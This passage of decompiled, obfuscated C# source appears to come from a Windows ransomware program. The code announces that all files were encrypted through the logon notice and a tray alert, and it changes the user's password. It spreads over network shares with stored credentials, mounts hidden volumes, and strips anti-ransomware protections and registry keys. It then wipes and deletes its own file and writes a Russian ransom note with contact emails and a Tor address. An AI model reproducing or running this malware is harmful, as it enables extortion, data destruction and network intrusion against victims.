        Arguments = obj0,
        WindowStyle = ProcessWindowStyle.Hidden,
        CreateNoWindow = true
      }
    }.Start();

    public static string IPHxEYiEhccEgJV([In] string obj0)
    {
      char[] charArray = obj0.ToCharArray();
      Array.Reverse((Array) charArray);
      return new string(charArray);
    }

    public static string oMKRHTBqYRfOk([In] string obj0) => Encoding.UTF8.GetString(Convert.FromBase64String(obj0));

    public static void zyckfWuwOlSm(
      string CaiYvtfKfPGICRJt = "",
      string vNzUIfnljpgMP = "SW5mb3JtYXRpb24uLi4=",
      string QUTncpMKdTgjxKB = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
    {
      CaiYvtfKfPGICRJt = BErRpdYOfQAwSr.IPHxEYiEhccEgJV("=42bn9Gbul2Vc52bpNnclZFduVmcyV3QcRlTgM3dvRmbpdFX0Z2bz9mcjlWTcVkUBdFVG90U");
      try
      {
        RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(BErRpdYOfQAwSr.oMKRHTBqYRfOk(CaiYvtfKfPGICRJt), true);
        if (registryKey != null)
        {
          registryKey.SetValue(BErRpdYOfQAwSr.oMKRHTBqYRfOk("TGVnYWxOb3RpY2VDYXB0aW9u"), (object) BErRpdYOfQAwSr.oMKRHTBqYRfOk(vNzUIfnljpgMP));
          registryKey.SetValue(BErRpdYOfQAwSr.oMKRHTBqYRfOk("TGVnYWxOb3RpY2VUZXh0"), (object) BErRpdYOfQAwSr.oMKRHTBqYRfOk(QUTncpMKdTgjxKB));
          registryKey.Close();
        }
      }
      catch
      {
      }
      try
      {
        CaiYvtfKfPGICRJt = BErRpdYOfQAwSr.IPHxEYiEhccEgJV("tVGdzl3UcNXZpNWas9GUc52bpNnclZFduVmcyV3QcN3dvRmbpdFX0Z2bz9mcjlWTcVkUBdFVG90U");
        RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(BErRpdYOfQAwSr.oMKRHTBqYRfOk(CaiYvtfKfPGICRJt), true);
        if (registryKey == null)
          return;
        registryKey.SetValue(BErRpdYOfQAwSr.oMKRHTBqYRfOk("bGVnYWxub3RpY2VjYXB0aW9u"), (object) BErRpdYOfQAwSr.oMKRHTBqYRfOk(vNzUIfnljpgMP));
        registryKey.SetValue(BErRpdYOfQAwSr.oMKRHTBqYRfOk("bGVnYWxub3RpY2V0ZXh0"), (object) BErRpdYOfQAwSr.oMKRHTBqYRfOk(QUTncpMKdTgjxKB));
        registryKey.Close();
      }
      catch
      {
      }
    }

    public static void bIoyQTORDlN()
    {
      try
      {
        if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
          return;
        if (BErRpdYOfQAwSr.EMkDRelwWGZ == "YES" && !string.IsNullOrEmpty(BErRpdYOfQAwSr.EhKqkDBbta) && !string.IsNullOrEmpty(BErRpdYOfQAwSr.hXdhfhCZQZwsD))
          BErRpdYOfQAwSr.zyckfWuwOlSm(vNzUIfnljpgMP: BErRpdYOfQAwSr.EhKqkDBbta, QUTncpMKdTgjxKB: BErRpdYOfQAwSr.hXdhfhCZQZwsD);
        else
          BErRpdYOfQAwSr.zyckfWuwOlSm();
      }
      catch
      {
      }
    }

    public static void avpYLdZBuA(string POKtYIiJXMjwxKG = "SW5mb3JtYXRpb24uLi4=", string gcqDNlizCVsp = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==") => new NotifyIcon()
    {
      Icon = SystemIcons.Warning,
      Visible = true,
      BalloonTipIcon = ToolTipIcon.Warning,
      BalloonTipTitle = BErRpdYOfQAwSr.oMKRHTBqYRfOk(POKtYIiJXMjwxKG),
      BalloonTipText = BErRpdYOfQAwSr.oMKRHTBqYRfOk(gcqDNlizCVsp)
    }.ShowBalloonTip(30000);

    public static void dMZRilCNEznH([In] string obj0) => BErRpdYOfQAwSr.uATAppcKlZ("net.exe", "user " + WindowsIdentity.GetCurrent().Name.Split('\\')[1].ToString() + " " + obj0);

    private static void qBOJnbpOcHbwx()
    {
      kRQDUzryMSl.XWEwnDcFAIe();
      BErRpdYOfQAwSr.XcEEPGrLNtid = kRQDUzryMSl.kyKQHCEMhl();
      foreach (lVcAopDuxvDO lVcAopDuxvDo in lVcAopDuxvDO.zyEAzUDHaOZgE())
        BErRpdYOfQAwSr.UfvFMUrtpRxlu.Add(lVcAopDuxvDo.get_IPAddress());
      BErRpdYOfQAwSr.YTTlQKYVEhwWmOpJ = BErRpdYOfQAwSr.XcEEPGrLNtid.Union<string>((IEnumerable<string>) BErRpdYOfQAwSr.UfvFMUrtpRxlu).ToList<string>();
      foreach (string str in BErRpdYOfQAwSr.YTTlQKYVEhwWmOpJ)
      {
        if (str.StartsWith("10.") || str.StartsWith("172.") || str.StartsWith("192.168.") || str.StartsWith(""))
        {
          if (kRQDUzryMSl.WxuDleZZaODM(str))
          {
            try
            {
              if (BErRpdYOfQAwSr.vJXCvrLeIURfhG == "YES")
              {
                for (int index = 0; index < kRQDUzryMSl.mjecbWlMAxoHXA.Count; ++index)
                  BErRpdYOfQAwSr.uATAppcKlZ("net.exe", "use \\\\" + str + " /USER:" + kRQDUzryMSl.mjecbWlMAxoHXA[index] + " " + kRQDUzryMSl.iECfpnwmQTyE[index]);
              }
              else
                BErRpdYOfQAwSr.uATAppcKlZ("net.exe", "use \\\\" + str);
            }
            catch
            {
            }
          }
        }
      }
      try
      {
        foreach (string input in new kRQDUzryMSl.HOhoFavvjFpw(kRQDUzryMSl.BngWFrPEMFij.vfRRmLmIxNWz, kRQDUzryMSl.YGmqXvJtDkEy.cRUwukJbtGBZtLW, kRQDUzryMSl.PxcrKvhDXsA.qsCJHFLrVdxx, kRQDUzryMSl.OcMOKzcsaQRkpAXu.WOYBMlKmNta))
        {
          foreach (Match match in Regex.Matches(input, "\\\\\\\\[a-zA-Z0-9\\.\\-_]{1,}(\\\\[a-zA-Z0-9\\-_]{1,}){1,}[\\$]{0,1}"))
          {
            try
            {
              if (BErRpdYOfQAwSr.vJXCvrLeIURfhG == "YES")
              {
                for (int index = 0; index < kRQDUzryMSl.mjecbWlMAxoHXA.Count; ++index)
                  BErRpdYOfQAwSr.uATAppcKlZ("net.exe", "use " + match.ToString() + " /USER:" + kRQDUzryMSl.mjecbWlMAxoHXA[index] + " " + kRQDUzryMSl.iECfpnwmQTyE[index]);
              }
              else
                BErRpdYOfQAwSr.uATAppcKlZ("net.exe", "use " + match.ToString());
            }
            catch
            {
            }
            if (!BErRpdYOfQAwSr.nMCOBGfKnYn.Contains(match.ToString()))
              BErRpdYOfQAwSr.nMCOBGfKnYn.Add(match.ToString());
          }
        }
      }
      catch (Exception ex)
      {
      }
      if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
      {
        try
        {
          string str = BErRpdYOfQAwSr.IPHxEYiEhccEgJV("tVGdzl3UcNXZpNWas9GUc52bpNnclZFduVmcyV3QcN3dvRmbpdFX0Z2bz9mcjlWTcVkUBdFVG90U");
          RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(BErRpdYOfQAwSr.oMKRHTBqYRfOk(str), true);
          if (registryKey != null)
          {
            registryKey.SetValue(BErRpdYOfQAwSr.oMKRHTBqYRfOk("TG9jYWxBY2NvdW50VG9rZW5GaWx0ZXJQb2xpY3k="), (object) 1, RegistryValueKind.DWord);
            registryKey.SetValue(BErRpdYOfQAwSr.oMKRHTBqYRfOk("RW5hYmxlTGlua2VkQ29ubmVjdGlvbnM="), (object) 1, RegistryValueKind.DWord);
            registryKey.Close();
          }
        }
        catch
        {
        }
      }
      if (BErRpdYOfQAwSr.CpuCxDkASAKU == "YES")
      {
        try
        {
          string path = Path.GetTempFileName().Replace(".tmp", ".bat");
          System.IO.File.WriteAllText(path, BErRpdYOfQAwSr.oMKRHTBqYRfOk("bW91bnR2b2wgfCBmaW5kICJ9XCIgPiB2LnR4dAoKKEZvciAvRiAlJWkgSW4gKHYudHh0KSBEbyAoCiAgICAgIFNldCBmcmVlZHJpdmU9MAogICAgICBGT1IgJSVkIElOIChDIEQgRSBGIEcgSCBJIEogSyBMIE0gTiBPIFAgUSBSIFMgVCBVIFYgVyBYIFkgWikgRE8gKAogICAgICAgICAgICBJRiBOT1QgRVhJU1QgJSVkOlwgKAogICAgICAgICAgICAgICAgICBJRiAiIWZyZWVkcml2ZSEiPT0iMCIgKAogICAgICAgICAgICAgICAgICAgICAgICBTZXQgZnJlZWRyaXZlPSUlZAogICAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICkKICAgICAgKQogICAgICBtb3VudHZvbCAhZnJlZWRyaXZlITogJSVpCiAgICAgIHBpbmcgLW4gMiAxMjcuMC4wLjEKKSkKU2V0IGRyaXZlaWQ9MApGT1IgJSVkIElOIChDIEQgRSBGIEcgSCBJIEogSyBMIE0gTiBPIFAgUSBSIFMgVCBVIFYgVyBYIFkgWikgRE8gKAogICAgICBJRiBFWElTVCAlJWQ6XCAoCiAgICAgICAgICAgIFNldCAvYSBkcml2ZWlkKz0xCiAgICAgICAgICAgIGVjaG8gXjxTaGFyZWRGb2xkZXIgbmFtZT0iIWRyaXZlaWQhIiBob3N0UGF0aD0iJSVkOlwiIHdyaXRhYmxlPSJ0cnVlIi9ePiA+PnNmLnR4dAogICAgICAgICAp"), Encoding.ASCII);
          BErRpdYOfQAwSr.uATAppcKlZ("cmd.exe", "/C " + path);
          if (System.IO.File.Exists(path))
            System.IO.File.Delete(path);
          if (System.IO.File.Exists(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "v.txt")))
            System.IO.File.Delete(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "v.txt"));
          if (System.IO.File.Exists(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "sf.txt")))
            System.IO.File.Delete(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "sf.txt"));
        }
        catch
        {
        }
      }
      foreach (ManagementObject managementObject in new ManagementObjectSearcher("select * from Win32_NetworkConnection").Get())
      {
        if (!BErRpdYOfQAwSr.nMCOBGfKnYn.Contains(managementObject.Path.ToString().Split('=')[1].ToString().Replace("\\\\", "\\").Replace("\\\\\\\\", "\\\\").Replace("\"", "").Split('(')[0].Trim()))
          BErRpdYOfQAwSr.nMCOBGfKnYn.Add(managementObject.Path.ToString().Split('=')[1].ToString().Replace("\\\\", "\\").Replace("\\\\\\\\", "\\\\").Replace("\"", "").Split('(')[0].Trim().Replace("IPC$", "") + "Users");
      }
    }

    public static bool oTRBkZZrvG()
    {
      WebRequest webRequest = WebRequest.Create("https://www.google.com/");
      try
      {
        webRequest.GetResponse();
      }
      catch
      {
        return false;
      }
      return true;
    }

    public static void EnvRhAFwnNeKeW([In] string obj0) => new Process()
    {
      StartInfo = new ProcessStartInfo()
      {
        FileName = BErRpdYOfQAwSr.oMKRHTBqYRfOk("cG93ZXJzaGVsbC5leGU="),
        Arguments = ("& " + obj0),
        RedirectStandardError = true,
        RedirectStandardOutput = true,
        UseShellExecute = false,
        CreateNoWindow = true
      }
    }.Start();

    private static bool NHrsaNbqqwFFKh([In] string obj0, [In] string obj1)
    {
      try
      {
        FileSystemAccessRule rule1 = new FileSystemAccessRule(obj0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
        DirectoryInfo directoryInfo = new DirectoryInfo(obj1);
        DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
        bool modified;
        accessControl.ModifyAccessRule(AccessControlModification.Set, (AccessRule) rule1, out modified);
        if (!modified)
          return false;
        FileSystemAccessRule rule2 = new FileSystemAccessRule(obj0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
        accessControl.ModifyAccessRule(AccessControlModification.Add, (AccessRule) rule2, out modified);
        if (!modified)
          return false;
        directoryInfo.SetAccessControl(accessControl);
        return true;
      }
      catch (Exception ex)
      {
        return false;
      }
    }

    public static bool AamQmrXSkACS([In] string obj0)
    {
      try
      {
        BErRpdYOfQAwSr.WYVxZrhpKQNU wyVxZrhpKqnu = new BErRpdYOfQAwSr.WYVxZrhpKQNU();
        DriveInfo[] drives = DriveInfo.GetDrives();
        wyVxZrhpKqnu.uAYBqoxFKKpTW = Path.GetPathRoot(obj0);
        DriveInfo driveInfo = ((IEnumerable<DriveInfo>) drives).FirstOrDefault<DriveInfo>(new Func<DriveInfo, bool>(wyVxZrhpKqnu.\u003CIsDriveNTFS\u003Eb__21));
        return driveInfo != null && driveInfo.DriveFormat == "NTFS";
      }
      catch
      {
        return false;
      }
    }

    public static string DhkyAUdEoqAPuutg([In] SecureString obj0)
    {
      string empty = string.Empty;
      IntPtr bstr = Marshal.SecureStringToBSTR(obj0);
      try
      {
        return Marshal.PtrToStringBSTR(bstr);
      }
      finally
      {
        Marshal.ZeroFreeBSTR(bstr);
      }
    }

    public static void aAebNXDYZjDhw()
    {
      try
      {
        if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
          return;
        string str1 = BErRpdYOfQAwSr.IPHxEYiEhccEgJV("==wcu9Wa0B3Tg42bpRXdjVGeFBSZslmRgU2Zh1WSc52bpNnclZFduVmcyV3QcRlTgM3dvRmbpdFX0Z2bz9mcjlWTcVkUBdFVG90U");
        try
        {
          RegistryKey registryKey1 = Registry.LocalMachine.OpenSubKey(BErRpdYOfQAwSr.oMKRHTBqYRfOk(str1), true);
          if (registryKey1 != null)
          {
            registryKey1.DeleteSubKey(BErRpdYOfQAwSr.oMKRHTBqYRfOk("dnNzYWRtaW4uZXhl"));
            registryKey1.DeleteSubKey(BErRpdYOfQAwSr.oMKRHTBqYRfOk("d21pYy5leGU="));
            registryKey1.DeleteSubKey(BErRpdYOfQAwSr.oMKRHTBqYRfOk("d2JhZG1pbi5leGU="));
            registryKey1.DeleteSubKey(BErRpdYOfQAwSr.oMKRHTBqYRfOk("YmNkZWRpdC5leGU="));
            registryKey1.DeleteSubKey(BErRpdYOfQAwSr.oMKRHTBqYRfOk("cG93ZXJzaGVsbC5leGU="));
            registryKey1.DeleteSubKey(BErRpdYOfQAwSr.oMKRHTBqYRfOk("ZGlza3NoYWRvdy5leGU="));
            registryKey1.DeleteSubKey(BErRpdYOfQAwSr.oMKRHTBqYRfOk("bmV0LmV4ZQ=="));
            registryKey1.Close();
          }
          string str2 = BErRpdYOfQAwSr.IPHxEYiEhccEgJV("u9Wa0F2YpxGcwFEXn9GT05WZ2VEXzV2YpZnclNFX0V2Us9mc052bDRnblJnc1NEXNVEVTl1U");
          RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey(BErRpdYOfQAwSr.oMKRHTBqYRfOk(str2), true);
          if (registryKey2 != null)
          {
            registryKey2.DeleteSubKey(BErRpdYOfQAwSr.oMKRHTBqYRfOk("UmFjY2luZQ=="));
            registryKey2.Close();
          }
          string str3 = BErRpdYOfQAwSr.IPHxEYiEhccEgJV("=UkUBdFVG90U");
          RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey(BErRpdYOfQAwSr.oMKRHTBqYRfOk(str3), true);
          if (registryKey3 != null)
          {
            registryKey3.DeleteSubKey(BErRpdYOfQAwSr.oMKRHTBqYRfOk("UmFjY2luZQ=="));
            registryKey3.Close();
          }
          string str4 = BErRpdYOfQAwSr.IPHxEYiEhccEgJV("=UkUBdFVG90U");
          RegistryKey registryKey4 = Registry.CurrentUser.OpenSubKey(BErRpdYOfQAwSr.oMKRHTBqYRfOk(str4), true);
          if (registryKey4 != null)
          {
            registryKey4.DeleteSubKey(BErRpdYOfQAwSr.oMKRHTBqYRfOk("UmFjY2luZQ=="));
            registryKey4.Close();
          }
        }
        catch
        {
        }
        BErRpdYOfQAwSr.uATAppcKlZ(BErRpdYOfQAwSr.oMKRHTBqYRfOk("dGFza2tpbGw="), BErRpdYOfQAwSr.oMKRHTBqYRfOk("L0YgL0lNIFJhY2NpbmVTZXR0aW5ncy5leGU="));
        BErRpdYOfQAwSr.uATAppcKlZ(BErRpdYOfQAwSr.oMKRHTBqYRfOk("cmVn"), BErRpdYOfQAwSr.oMKRHTBqYRfOk("ZGVsZXRlICJIS0NVXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biIgL1YgIlJhY2NpbmUgVHJheSIgL0Y="));
        BErRpdYOfQAwSr.uATAppcKlZ(BErRpdYOfQAwSr.oMKRHTBqYRfOk("cmVn"), BErRpdYOfQAwSr.oMKRHTBqYRfOk("ZGVsZXRlIEhLQ1VcU29mdHdhcmVcUmFjY2luZSAvRg=="));
        BErRpdYOfQAwSr.uATAppcKlZ(BErRpdYOfQAwSr.oMKRHTBqYRfOk("c2NodGFza3M="), BErRpdYOfQAwSr.oMKRHTBqYRfOk("L0RFTEVURSAvVE4gIlJhY2NpbmUgUnVsZXMgVXBkYXRlciIgL0Y="));
      }
      catch
      {
      }
    }

    public static void lPoyIxkPQfSfzaP([In] string obj0, [In] byte[] obj1)
    {
      try
      {
        byte[] bytes = Encoding.ASCII.GetBytes(BErRpdYOfQAwSr.oMKRHTBqYRfOk("R290QWxsRG9uZQ=="));
        using (FileStream fileStream = new FileStream(obj0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
        {
          fileStream.Write(obj1, 0, obj1.Length);
          fileStream.Write(bytes, 0, bytes.Length);
        }
      }
      catch (Exception ex)
      {
      }
    }

    public static void esQslEvKNI()
    {
      string str = BErRpdYOfQAwSr.IPHxEYiEhccEgJV("==QblR3c5NVZslmRcx2byRnbvNEX0V2Us9mc052bDRnblJnc1NEXNVEVTl1U");
      try
      {
        RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(BErRpdYOfQAwSr.oMKRHTBqYRfOk(str), true);
        if (registryKey == null)
          return;
        registryKey.SetValue(BErRpdYOfQAwSr.oMKRHTBqYRfOk("TG9uZ1BhdGhzRW5hYmxlZA=="), (object) 1, RegistryValueKind.DWord);
        registryKey.Close();
      }
      catch
      {
      }
    }

    public static void PNdHksrWsNzLSUd()
    {
      BErRpdYOfQAwSr.uATAppcKlZ("cmd.exe", BErRpdYOfQAwSr.oMKRHTBqYRfOk("L0MgcGluZyAxMjcuMC4wLjcgLW4gMyA+IE51bCAmIGZzdXRpbCBmaWxlIHNldFplcm9EYXRhIG9mZnNldD0wIGxlbmd0aD01MjQyODgg4oCcJXPigJ0gJiBEZWwgL2YgL3Eg4oCcJXPigJ0="));
      string str = BErRpdYOfQAwSr.oMKRHTBqYRfOk("L0MgY2hvaWNlIC9DIFkgL04gL0QgWSAvVCAzICYgRGVsIA==");
      Process.Start(new ProcessStartInfo()
      {
        Arguments = "\"" + str + "\"" + Assembly.GetEntryAssembly().Location,
        WindowStyle = ProcessWindowStyle.Hidden,
        CreateNoWindow = true,
        FileName = "cmd.exe"
      });
      Environment.Exit(0);
    }

    public static void eIGoCSnmXvMXP([In] string obj0)
    {
      try
      {
        FileAttributes attributes = System.IO.File.GetAttributes(obj0);
        if ((attributes & FileAttributes.ReadOnly) != FileAttributes.ReadOnly)
          return;
        System.IO.File.SetAttributes(obj0, attributes & ~FileAttributes.ReadOnly);
      }
      catch (Exception ex1)
      {
        if (!BErRpdYOfQAwSr.vQOhJPfkmenqxsh)
          return;
        try
        {
          System.IO.File.AppendAllText(BErRpdYOfQAwSr.OpWBXzCwVRYsxq, "File: " + obj0 + " - Error while removing readonly attribute: " + ex1.Message + "\r\n");
        }
        catch (Exception ex2)
        {
        }
      }
    }

    public static string OLRxBoNESYHA()
    {
      OperatingSystem osVersion = Environment.OSVersion;
      Version version = osVersion.Version;
      string str = "";
      if (osVersion.Platform == PlatformID.Win32Windows)
      {
        switch (version.Minor)
        {
          case 0:
            str = "95";
            break;
          case 10:
            str = !(version.Revision.ToString() == "2222A") ? "98" : "98SE";
            break;
          case 90:
            str = "Me";
            break;
        }
      }
      else if (osVersion.Platform == PlatformID.Win32NT)
      {
        switch (version.Major)
        {
          case 3:
            str = "NT 3.51";
            break;
          case 4:
            str = "NT 4.0";
            break;
          case 5:
            str = version.Minor != 0 ? "XP" : "2000";
            break;
          case 6:
            str = version.Minor != 0 ? (version.Minor != 1 ? (version.Minor != 2 ? "8.1" : "8") : "7") : "Vista";
            break;
          case 10:
            str = "10";
            break;
        }
      }
      if (str != "")
      {
        str = "Windows " + str;
        if (osVersion.ServicePack != "")
          str = str + " " + osVersion.ServicePack;
      }
      return str;
    }

    public static string WEEGseTDeH([In] string obj0)
    {
      string path = Path.GetTempPath() + "\\Инструкция.txt";
      try
      {
        if (!System.IO.File.Exists(path))
        {
          using (StreamWriter streamWriter = new StreamWriter(path))
          {
            streamWriter.WriteLine(BErRpdYOfQAwSr.oMKRHTBqYRfOk("0JLQsNGI0Lgg0LTQvtC60YPQvNC10L3RgtGLLCDQsdCw0LfRiyDQtNCw0L3QvdGL0YUg0Lgg0LTRgNGD0LPQuNC1INGE0LDQudC70Ysg0LHRi9C70Lgg0LfQsNGI0LjRhNGA0L7QstCw0L3Riy4g0J3QviDQvdC1INGB0YLQvtC40YIg0L/QtdGA0LXQttC40LLQsNGC0YwhIA0K0JzRiyDQstGB0LUg0YDQsNGB0YjQuNGE0YDRg9C10Lwg0Lgg0LLQtdGA0L3QtdC8INC90LAg0YHQstC+0Lgg0LzQtdGB0YLQsC4NCg0K0JTQu9GPINGA0LDRgdGI0LjRhNGA0L7QstC60Lgg0LTQsNC90L3Ri9GFOg0KDQrQndCw0L/QuNGI0LjRgtC1INC90LAg0L/QvtGH0YLRgyAtIHNlY3VyaXR5ODQ5QG51a2UuYWZyaWNhDQogDQogKtCSINC/0LjRgdGM0LzQtSDRg9C60LDQt9Cw0YLRjCDQktCw0Ygg0LvQuNGH0L3Ri9C5INC40LTQtdC90YLQuNGE0LjQutCw0YLQvtGAIChLZXkgSWRlbnRpZmllcikNCiAq0J/RgNC40LrRgNC10L/QuNGC0LUgMiDRhNCw0LnQu9CwINC00L4gMiDQvNCxINC00LvRjyDRgtC10YHRgtC+0LLQvtC5INGA0LDRgdGI0LjRhNGA0L7QstC60LguIA0KICDQvNGLINC40YUg0YDQsNGB0YjQuNGE0YDRg9C10LwsINCyINC60LDRh9C10YHRgtCy0LUg0LTQvtC60LDQt9Cw0YLQtdC70YzRgdGC0LLQsCwg0YfRgtC+INCi0J7Qm9Cs0JrQniDQnNCrINC80L7QttC10Lwg0YDQsNGB0YjQuNGE0YDQvtCy0LDRgtGMINGE0LDQudC70YsuDQoNCtCS0JDQltCd0J4hINCd0LUg0L/QuNGI0LjRgtC1INGBIG1haWwucnUgKNC6INC90LDQvCDQvdC1INC00L7RhdC+0LTRj9GCINC/0LjRjNGB0LzQsCkg0JjRgdC/0L7Qu9GM0LfRg9C50YLQtSAtIHlhbmRleC5ydSBnbWFpbC5jb20g0Lgg0YIu0LQuIA0K0JLRgdC1INC60YDQvtC80LUgbWFpbC5ydQ0KDQogLdCn0LXQvCDQsdGL0YHRgtGA0LXQtSDQstGLINGB0L7QvtCx0YnQuNGC0LUg0L3QsNC8INGB0LLQvtC5INC40LTQtdC90YLQuNGE0LjQutCw0YLQvtGALCDRgtC10Lwg0LHRi9GB0YLRgNC10LUg0LzRiyDQstGL0LrQu9GO0YfQuNC8INC/0YDQvtC40LfQstC+0LvRjNC90L7QtSDRg9C00LDQu9C10L3QuNC1INGE0LDQudC70L7Qsi4NCiAt0J3QsNC/0LjRgdCw0LIg0L3QsNC8INC90LAg0L/QvtGH0YLRgyDQstGLINC/0L7Qu9GD0YfQuNGC0LUg0LTQsNC70YzQvdC10LnRiNC40LUg0LjQvdGB0YLRgNGD0LrRhtC40Lgg0L/QviDQvtC/0LvQsNGC0LUuDQoNCtCSINC+0YLQstC10YLQvdC+0Lwg0L/QuNGB0YzQvNC1INCS0Ysg0L/QvtC70YPRh9C40YLQtSDQv9GA0L7Qs9GA0LDQvNC80YMg0LTQu9GPINGA0LDRgdGI0LjRhNGA0L7QstC60LguDQrQn9C+0YHQu9C1INC30LDQv9GD0YHQutCwINC/0YDQvtCz0YDQsNC80LzRiy3QtNC10YjQuNGE0YDQvtCy0YnQuNC60LAg0LLRgdC1INCS0LDRiNC4INGE0LDQudC70Ysg0LHRg9C00YPRgiDQstC+0YHRgdGC0LDQvdC+0LLQu9C10L3Riy4NCg0K0JzRiyDQs9Cw0YDQsNC90YLQuNGA0YPQtdC8Og0KMTAwJSDRg9GB0L/QtdGI0L3QvtC1INCy0L7RgdGB0YLQsNC90L7QstC70LXQvdC40LUg0LLRgdC10YUg0LLQsNGI0LjRhSDRhNCw0LnQu9C+0LINCjEwMCUg0LPQsNGA0LDQvdGC0LjRjiDRgdC+0L7RgtCy0LXRgtGB0YLQstC40Y8NCjEwMCUg0LHQtdC30L7Qv9Cw0YHQvdGL0Lkg0Lgg0L3QsNC00LXQttC90YvQuSDRgdC10YDQstC40YENCtCS0L3QuNC80LDQvdC40LUhDQogKiDQndC1INC/0YvRgtCw0LnRgtC10YHRjCDRg9C00LDQu9C40YLRjCDQv9GA0L7Qs9GA0LDQvNC80YMg0LjQu9C4INC30LDQv9GD0YHQutCw0YLRjCDQsNC90YLQuNCy0LjRgNGD0YHQvdGL0LUg0YHRgNC10LTRgdGC0LLQsA0KICog0J/QvtC/0YvRgtC60Lgg0YHQsNC80L7RgdGC0L7Rj9GC0LXQu9GM0L3QvtC5INGA0LDRgdGI0LjRhNGA0L7QstC60Lgg0YTQsNC50LvQvtCyINC/0YDQuNCy0LXQtNGD0YIg0Log0L/QvtGC0LXRgNC1INCS0LDRiNC40YUg0LTQsNC90L3Ri9GFDQogKiDQlNC10YjQuNGE0YDQsNGC0L7RgNGLINC00YDRg9Cz0LjRhSDQv9C+0LvRjNC30L7QstCw0YLQtdC70LXQuSDQvdC10YHQvtCy0LzQtdGB0YLQuNC80Ysg0YEg0JLQsNGI0LjQvNC4INC00LDQvdC90YvQvNC4LCDRgtCw0Log0LrQsNC6INGDINC60LDQttC00L7Qs9C+INC/0L7Qu9GM0LfQvtCy0LDRgtC10LvRjw0K0YPQvdC40LrQsNC70YzQvdGL0Lkg0LrQu9GO0Ycg0YjQuNGE0YDQvtCy0LDQvdC40Y8NCg0KDQrQmtCw0LbQtNGL0LUgMjQg0YfQsNGB0LAg0YPQtNCw0LvRj9GO0YLRgdGPIDI0INGE0LDQudC70LAsINC90LXQvtCx0YXQvtC00LjQvNC+INC/0YDQuNGB0LvQsNGC0Ywg0YHQstC+0Lkg0LjQtNC10L3RgtC40YTQuNC60LDRgtC+0YAg0YfRgtC+0LEg0LzRiyDQvtGC0LrQu9GO0YfQuNC70Lgg0Y3RgtGDINGE0YPQvdC60YbQuNGOLg0K0JrQsNC20LTRi9C1IDI0INGH0LDRgdCwINGB0YLQvtC40LzQvtGB0YLRjCDRgNCw0YHRiNC40YTRgNC+0LLQutC4INC00LDQvdC90YvRhSDRg9Cy0LXQu9C40YfQuNCy0LDQtdGC0YHRjyDQvdCwIDMwJSAo0YfQtdGA0LXQtyA3MiDRh9Cw0YHQsCDRgdGD0LzQvNCwINGE0LjQutGB0LjRgNGD0LXRgtGB0Y8pDQoNCg0KUC5TDQrQldGB0LvQuCDQktCw0Lwg0L3QtSDQvtGC0LLQtdGC0LjQu9C4INCyINGC0LXRh9C10L3QuNC4IDQ4INGH0LDRgdC+0LIuINCS0LDQvCDQvdGD0LbQvdC+INCx0YPQtNC10YIg0YHQstGP0LfQsNGC0YzRgdGPINGBINC90LDQvNC4INC/0L4g0LTQvtC/0L7Qu9C90LjRgtC10LvRjNC90YvQvCDQutC+0L3RgtCw0LrRgtCw0LwuIA0KDQrQodC60LDRh9Cw0LnRgtC1INC4INGD0YHRgtCw0L3QvtCy0LjRgtC1IFRvciBCcm93c2VyIC0gaHR0cHM6Ly93d3cudG9ycHJvamVjdC5vcmcvcnUvZG93bmxvYWQvDQrQntGC0LrRgNC+0LnRgtC1INGH0LXRgNC10LcgVG9yIEJyb3dzZXIg0YHQsNC50YIgLSBodHRwOi8vc29uYXJtc25pa28ybHZmdS5vbmlvbiAgICjRgdCw0LnRgiDQvdC1INCx0YPQtNC10YIg0YDQsNCx0L7RgtCw0YLRjCDRh9C10YDQtdC3INC+0LHRi9GH0L3Ri9C5INCx0YDQsNGD0LfQtdGALCDRgtC+0LvRjNC60L4g0YfQtdGA0LXQtyDQotCe0KApDQrQl9Cw0YDQtdCz0LjRgdGC0YDQuNGA0YPQudGC0LXRgdGMINC4INC90LDQv9C40YjQuNGC0LUg0L3QsNC8LiANCg0KKtCd0LDRiCDQvdC40Log0LIgU29uYXInZSAtIHNhdmVmaWxlMzY1"));
            streamWriter.WriteLine("\r\n");
            streamWriter.WriteLine(BErRpdYOfQAwSr.oMKRHTBqYRfOk("S2V5IElkZW50aWZpZXI6IA=="));
            streamWriter.WriteLine(obj0);
          }
        }
        else
          System.IO.File.AppendAllText(path, "\r\nAditional KeyId:\r\n" + obj0);
        return path;
      }
      catch (Exception ex1)
      {
        if (BErRpdYOfQAwSr.vQOhJPfkmenqxsh)
        {
          try
          {
